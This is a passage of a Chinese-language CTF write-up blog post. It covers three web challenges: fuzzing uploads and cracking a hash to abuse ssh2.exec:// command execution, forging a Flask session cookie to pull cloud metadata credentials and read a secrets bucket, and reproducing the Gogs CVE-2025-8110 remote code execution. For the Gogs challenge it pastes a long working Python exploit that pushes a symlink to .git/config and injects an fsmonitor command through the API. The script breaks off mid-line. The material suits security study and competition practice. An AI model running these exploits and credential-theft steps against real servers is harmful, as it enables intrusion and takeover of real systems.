class="title">padding</span>: 20<span class="title">px</span>; <span class="title">background</span>: <span class="title">rgba</span>(0,0,0,0.3);&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h3</span>&gt;📥 歌曲/文件下载&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">get</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        文件名: &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">file</span>&quot; <span class="title">placeholder</span>=&quot;输入文件名, 如 <span class="title">MGSG202500</span>.<span class="title">mp3</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;下载文件&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span> </span></span><br><span class="line"><span class="class"><span class="title">echo</span> $<span class="title">admin_panel</span>;</span></span><br><span class="line"><span class="class"><span class="title">require_once</span> &#x27;<span class="title">includes</span>/<span class="title">footer</span>.<span class="title">php</span>&#x27;; </span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里上传文件发现文件名字只有最后两位会改变</p>
+<p>可以使用指令来fuzz一下有没有其他文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seq -w 0 99 &gt; num.txt</span><br></pre></td></tr></table></figure>
+
+<p>指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u &quot;http://80-ac3e9347-1eed-4363-a83d-695bb12473b0.challenge.ctfplus.cn/uploads/UNiCTF2026W1.W2&quot; \</span><br><span class="line">-w ./num.txt:W1 \</span><br><span class="line">-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt:W2 \</span><br><span class="line">-mc 200 -t 20 -p 0.1</span><br></pre></td></tr></table></figure>
+
+<p>是可以fuzz出来UNiCTF202667.db和UNiCTF202638.php</p>
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260207204457345.png" alt="image-20260207204457345"></p>
+<p>这题目考的是根据<code>ssh2</code>模块的定义，其中有一个<code>ssh2.exec://</code>协议支持远程执行命令 不过需要有效的凭证</p>
+<p>格式<code>ssh2.exec://user:pass@ip/cmd</code></p>
+<p>不能用admin&#x2F;admin888 我估计是权限不够 但是我们还有一组凭证 ctfer 密码使用hashcat去爆破试试看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 0 58d506617a1e20a9d87ab5a3debcb151 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260207205458306.png" alt="image-20260207205458306"></p>
+<p>很快就爆破出来<code>58d506617a1e20a9d87ab5a3debcb151:duhgrl</code></p>
+<p><code>ssh2.exec://ctfer:duhgrl@127.0.0.1/cat/flag &gt; /var/www/html/1.txt; </code></p>
+<h1 id="CloudDiag"><a href="#CloudDiag" class="headerlink" title="CloudDiag"></a>CloudDiag</h1><p>这道题随便注册个号 发现有session 习惯拿去flask-unsign爆破下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">D:\ctf\WEB\Flask-Unsign-master&gt;flask-unsign --unsign --cookie &quot;eyJib290X2lkIjoiMTc3MDQ2NDkyNy41ODc1MzMiLCJ1c2VyX2lkIjoyfQ.aYcmrQ.4caopIOKvAt8yT2PeagcEofVmBk&quot; --wordlist pass.txt --no-literal-eval</span><br><span class="line">[*] Session decodes to: &#123;&#x27;boot_id&#x27;: &#x27;1770464927.587533&#x27;, &#x27;user_id&#x27;: 2&#125;</span><br><span class="line">[*] Starting brute-forcer with 8 threads..</span><br><span class="line">[+] Found secret key after 80768 attemptser-secret-to</span><br><span class="line">b&#x27;dev-secret&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>成功找到secret 伪造admin的session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:\ctf\WEB\Flask-Unsign-master&gt;flask-unsign --sign --cookie &quot;&#123;&#x27;boot_id&#x27;: &#x27;1770464927.587533&#x27;, &#x27;user_id&#x27;: 1&#125;&quot; --secret &#x27;dev-secret&#x27;</span><br><span class="line">eyJib290X2lkIjoiMTc3MDQ2NDkyNy41ODc1MzMiLCJ1c2VyX2lkIjoxfQ.aYcomA.Z9yHOm2dv4WWYirH4AsfDoYy5tc</span><br></pre></td></tr></table></figure>
+
+<p>看到成功作为root登录 root可以看到所有创造的task 我们看到有一个历史记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://metadata:1338/latest/meta-data/iam/security-credentials/</span><br></pre></td></tr></table></figure>
+
+<p>可以通过这个路由拿到aws的认证所需要的东西</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;AccessKeyId&quot;: &quot;AKIA3592B2052AC94DDA&quot;,</span><br><span class="line">  &quot;Code&quot;: &quot;Success&quot;,</span><br><span class="line">  &quot;Expiration&quot;: &quot;2026-02-07T12:15:56.566862Z&quot;,</span><br><span class="line">  &quot;SecretAccessKey&quot;: &quot;4787b9bf4fac4523a535ab41f4b2817ba1dbdfa217104b5d9cf1d7c380ce98b3&quot;,</span><br><span class="line">  &quot;Token&quot;: &quot;20cac091fcd843499b6746d65f1c81a3b2ba3219adf141aebd10d53241b58c68&quot;,</span><br><span class="line">  &quot;Type&quot;: &quot;AWS-HMAC&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们加上有一个Cloud Explorer的功能</p>
+<p>输入Access Key ID Secret Access Key Session Token拿到了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clouddiag-public</span><br><span class="line">clouddiag-reports</span><br><span class="line">clouddiag-secrets</span><br></pre></td></tr></table></figure>
+
+<p>这三个Bucket 肯定看clouddiag-secrets</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flags/runtime/flag-19323baa03f7489d89230536696b7327.txt (54 bytes)</span><br><span class="line">notes/rotation.txt (77 bytes)</span><br></pre></td></tr></table></figure>
+
+<p>再把这个flags&#x2F;runtime&#x2F;flag-19323baa03f7489d89230536696b7327.txt填在Object Key (optional)即可拿到flag</p>
+<h1 id="gogogos"><a href="#gogogos" class="headerlink" title="gogogos"></a>gogogos</h1><p>指纹识别就是知道考的是CVE-2025-8110  参考文章<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90842">CVE-2025-8110 Gogs远程命令注入漏洞绕过分析与复现-先知社区</a></p>
+<p>这个题目就是复现cve 我是自己手动做的</p>
+<p>贴一个官方wp的脚本吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration</span></span><br><span class="line"></span><br><span class="line">TARGET_BASE_URL = <span class="string">&quot;http://localhost:3000&quot;</span> <span class="comment"># 目标Gogs, 需要开放注册功能或已存在可登录用户</span></span><br><span class="line">USERNAME = <span class="string">&quot;aaa&quot;</span>   <span class="comment"># 登录用户名</span></span><br><span class="line">PASSWORD = <span class="string">&quot;111111&quot;</span> <span class="comment"># 登录密码</span></span><br><span class="line">REPO_OWNER = <span class="string">&quot;aaa&quot;</span> <span class="comment"># 仓库所有者</span></span><br><span class="line">REPO_NAME = <span class="string">&quot;bbb&quot;</span>  <span class="comment"># 仓库名称</span></span><br><span class="line">SYMLINK_FILENAME = <span class="string">&quot;test&quot;</span>   <span class="comment"># 要创建的symlink文件名</span></span><br><span class="line">TARGET_FILE = <span class="string">&quot;.git/config&quot;</span> <span class="comment"># symlink指向的目标文件，这里是git配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Derived constants</span></span><br><span class="line">REPO_URL = <span class="string">f&quot;<span class="subst">&#123;TARGET_BASE_URL&#125;</span>/<span class="subst">&#123;REPO_OWNER&#125;</span>/<span class="subst">&#123;REPO_NAME&#125;</span>.git&quot;</span></span><br><span class="line">API_URL = <span class="string">f&quot;<span class="subst">&#123;TARGET_BASE_URL&#125;</span>/api/v1/repos/<span class="subst">&#123;REPO_OWNER&#125;</span>/<span class="subst">&#123;REPO_NAME&#125;</span>/contents/<span class="subst">&#123;SYMLINK_FILENAME&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> stat</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_rm_error</span>(<span class="params">func, path, exc_info</span>):</span><br><span class="line">    <span class="comment"># path contains the path of the file that couldn&#x27;t be removed</span></span><br><span class="line">    <span class="comment"># let&#x27;s just assume it&#x27;s read-only and try to make it writable.</span></span><br><span class="line">    os.chmod(path, stat.S_IWRITE)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        func(path)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup_git_repo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Setting up local git repository to push symlink &#x27;<span class="subst">&#123;SYMLINK_FILENAME&#125;</span>&#x27; -&gt; &#x27;<span class="subst">&#123;TARGET_FILE&#125;</span>&#x27;...&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&quot;temp_exploit_repo&quot;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            shutil.rmtree(<span class="string">&quot;temp_exploit_repo&quot;</span>, onerror=on_rm_error)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] Warning: Could not clean up old repo: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;temp_exploit_repo&quot;</span>):</span><br><span class="line">        os.makedirs(<span class="string">&quot;temp_exploit_repo&quot;</span>)</span><br><span class="line">    os.chdir(<span class="string">&quot;temp_exploit_repo&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subprocess.run([<span class="string">&quot;git&quot;</span>, <span class="string">&quot;init&quot;</span>], check=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Create a dummy file to commit first (optional, but good practice)</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;README.md&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">&quot;# POC Repo&quot;</span>)</span><br><span class="line">        subprocess.run([<span class="string">&quot;git&quot;</span>, <span class="string">&quot;add&quot;</span>, <span class="string">&quot;README.md&quot;</span>], check=<span class="literal">True</span>)</span><br><span class="line">        subprocess.run([<span class="string">&quot;git&quot;</span>, <span class="string">&quot;commit&quot;</span>, <span class="string">&quot;-m&quot;</span>, <span class="string">&quot;Initial commit&quot;</span>], check=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Create the symlink using git hash-object</span></span><br><span class="line">        <span class="comment"># We want SYMLINK_FILENAME to point to TARGET_FILE</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Creating symlink manually via git objects...&quot;</span>)</span><br><span class="line">        <span class="comment"># 1. Get hash of the target path string</span></span><br><span class="line">        <span class="comment"># Note: echo -n is important to avoid newline</span></span><br><span class="line">        proc = subprocess.run([<span class="string">&quot;git&quot;</span>, <span class="string">&quot;hash-object&quot;</span>, <span class="string">&quot;-w&quot;</span>, <span class="string">&quot;--stdin&quot;</span>], <span class="built_in">input</span>=TARGET_FILE.encode(), stdout=subprocess.PIPE, check=<span class="literal">True</span>)</span><br><span class="line">        blob_hash = proc.stdout.decode().strip()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2. Add to index as symlink (mode 120000)</span></span><br><span class="line">        subprocess.run([<span class="string">&quot;git&quot;</span>, <span class="string">&quot;update-index&quot;</span>, <span class="string">&quot;--add&quot;</span>, <span class="string">&quot;--cacheinfo&quot;</span>, <span class="string">&quot;120000&quot;</span>, blob_hash, SYMLINK_FILENAME], check=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Verify the mode in the index</span></span><br><span class="line">        proc_ls = subprocess.run([<span class="string">&quot;git&quot;</span>, <span class="string">&quot;ls-files&quot;</span>, <span class="string">&quot;-s&quot;</span>, SYMLINK_FILENAME], stdout=subprocess.PIPE, check=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Verified git index mode: <span class="subst">&#123;proc_ls.stdout.decode().strip()&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 3. Commit</span></span><br><span class="line">        subprocess.run([<span class="string">&quot;git&quot;</span>, <span class="string">&quot;commit&quot;</span>, <span class="string">&quot;-m&quot;</span>, <span class="string">&quot;Add malicious symlink&quot;</span>], check=<span class="literal">True</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 4. Push to remote</span></span><br><span class="line">        <span class="comment"># Construct URL with credentials</span></span><br><span class="line">        <span class="comment"># Handle protocol (http/https)</span></span><br><span class="line">        protocol = REPO_URL.split(<span class="string">&quot;://&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        rest = REPO_URL.split(<span class="string">&quot;://&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        auth_repo_url = <span class="string">f&quot;<span class="subst">&#123;protocol&#125;</span>://<span class="subst">&#123;USERNAME&#125;</span>:<span class="subst">&#123;PASSWORD&#125;</span>@<span class="subst">&#123;rest&#125;</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Pushing to <span class="subst">&#123;REPO_URL&#125;</span>...&quot;</span>)</span><br><span class="line">        subprocess.run([<span class="string">&quot;git&quot;</span>, <span class="string">&quot;remote&quot;</span>, <span class="string">&quot;add&quot;</span>, <span class="string">&quot;origin&quot;</span>, auth_repo_url], check=<span class="literal">True</span>)</span><br><span class="line">        subprocess.run([<span class="string">&quot;git&quot;</span>, <span class="string">&quot;push&quot;</span>, <span class="string">&quot;-u&quot;</span>, <span class="string">&quot;origin&quot;</span>, <span class="string">&quot;master&quot;</span>, <span class="string">&quot;-f&quot;</span>], check=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Symlink pushed successfully.&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Git operation failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        os.chdir(<span class="string">&quot;..&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_rce</span>(<span class="params">rce_command, proxies=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Triggering RCE by overwriting &#x27;<span class="subst">&#123;SYMLINK_FILENAME&#125;</span>&#x27; via API...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Command to execute: <span class="subst">&#123;rce_command&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Construct malicious git config</span></span><br><span class="line">    <span class="comment"># We include standard core settings to avoid breaking git immediately</span></span><br><span class="line">    <span class="comment"># The fsmonitor is the key payload</span></span><br><span class="line">    config_payload = <span class="string">f&quot;&quot;&quot;[core]</span></span><br><span class="line"><span class="string">    repositoryformatversion = 0</span></span><br><span class="line"><span class="string">    filemode = true</span></span><br><span class="line"><span class="string">    bare = false</span></span><br><span class="line"><span class="string">    logallrefupdates = true</span></span><br><span class="line"><span class="string">    ignorecase = true</span></span><br><span class="line"><span class="string">    precomposeunicode = true</span></span><br><span class="line"><span class="string">    fsmonitor = &quot;<span class="subst">&#123;rce_command&#125;</span>&quot;</span></span><br><span class="line"><span class="string">[remote &quot;origin&quot;]</span></span><br><span class="line"><span class="string">    url = <span class="subst">&#123;REPO_URL&#125;</span></span></span><br><span class="line"><span class="string">    fetch = +refs/heads/*:refs/remotes/origin/*</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Base64 encode the content</span></span><br><span class="line">    content_b64 = base64.b64encode(config_payload.encode()).decode()</span><br><span class="line">    </span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;content&quot;</span>: content_b64,</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Trigger RCE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;branch&quot;</span>: <span class="string">&quot;master&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: <span class="string">f&quot;token <span class="subst">&#123;get_token()&#125;</span>&quot;</span> <span class="keyword">if</span> <span class="literal">False</span> <span class="keyword">else</span> <span class="literal">None</span> <span class="comment"># We use Basic Auth</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Try to create a token first if Basic Auth fails or just use it</span></span><br><span class="line">    token = create_token(proxies)</span><br><span class="line">    <span class="keyword">if</span> token:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Obtained token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">        headers[<span class="string">&quot;Authorization&quot;</span>] = <span class="string">f&quot;token <span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">        auth = <span class="literal">None</span> <span class="comment"># Do not use basic auth if we have token</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Could not create token, falling back to Basic Auth (which failed previously with 401)&quot;</span>)</span><br><span class="line">        auth = (USERNAME, PASSWORD)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Sending PUT request to <span class="subst">&#123;API_URL&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.put(API_URL, json=payload, auth=auth, headers=headers, proxies=proxies)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Response Status Code: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Response Body: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">500</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Received 500 Internal Server Error. This is EXPECTED if the exploit worked!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    The &#x27;fsmonitor&#x27; command is executed when Gogs tries to run &#x27;git add&#x27; internally.&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    Check if the command &#x27;<span class="subst">&#123;rce_command&#125;</span>&#x27; was executed on the server.&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> response.status_code == <span class="number">200</span> <span class="keyword">or</span> response.status_code == <span class="number">201</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Received 200/201. The file was updated. Check if RCE triggered.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] Unexpected response status.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Request failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_token</span>(<span class="params">proxies=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Attempting to create an access token via API...&quot;</span>)</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;TARGET_BASE_URL&#125;</span>/api/v1/users/<span class="subst">&#123;USERNAME&#125;</span>/tokens&quot;</span></span><br><span class="line">    auth = (USERNAME, PASSWORD)</span><br><span class="line">    payload = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">f&quot;exploit_token_<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, json=payload, auth=auth, proxies=proxies)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">201</span>:</span><br><span class="line">            <span class="keyword">return</span> response.json().get(<span class="string">&quot;sha1&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to create token. Status: <span class="subst">&#123;response.status_code&#125;</span>, Body: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Token creation request failed: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Gogs CVE-2025-8110 RCE Exploit&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--command&quot;</span>, default=<span class="string">&quot;touch /tmp/GOGS_RCE_SUCCESS_CVE_2025_8110&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Command to execute on the server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--skip-setup&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Skip git repo setup (use if already pushed)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--proxy&quot;</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Proxy URL (default: None)&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    proxies = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> args.proxy:</span><br><span class="line">        proxies = &#123;<span class="string">&quot;http&quot;</span>: args.proxy, <span class="string">&quot;https&quot;</span>: args.proxy&#125;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] Using proxy: <span class="subst">&#123;args.proxy&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.skip_setup:</span><br><span class="line">        setup_git_repo()</span><br><span class="line">        <span class="comment"># Wait a moment to ensure consistency</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    rce_command = args.command</span><br><span class="line">    <span class="comment"># Escape double quotes for git config</span></span><br><span class="line">    rce_command = rce_command.replace(<span 